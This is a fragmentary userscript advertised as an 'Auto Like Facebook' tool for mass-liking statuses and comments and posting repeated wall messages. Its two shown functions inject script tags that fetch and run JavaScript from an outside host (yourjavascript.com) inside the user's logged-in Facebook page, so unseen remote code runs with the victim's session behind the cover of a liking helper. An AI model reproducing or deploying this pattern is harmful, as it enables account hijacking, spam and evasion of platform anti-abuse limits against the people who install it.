...
// @description			Auto Like Facebook by Jacky. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @description	                Mengirim banyak pesan di wall dengan pesan
// @author				Freez
// @authorURL			http://www.facebook.com/asep.nyamer
// @homepage			http://www.wysoserious.blogspot.com/
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://yourjavascript.com/52111981140/why.txt.js",b.body.appendChild(a);void(0);};}
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="http://yourjavascript.com/11089121115/comment.txt.js",b.body.appendChild(a);void(0);};}
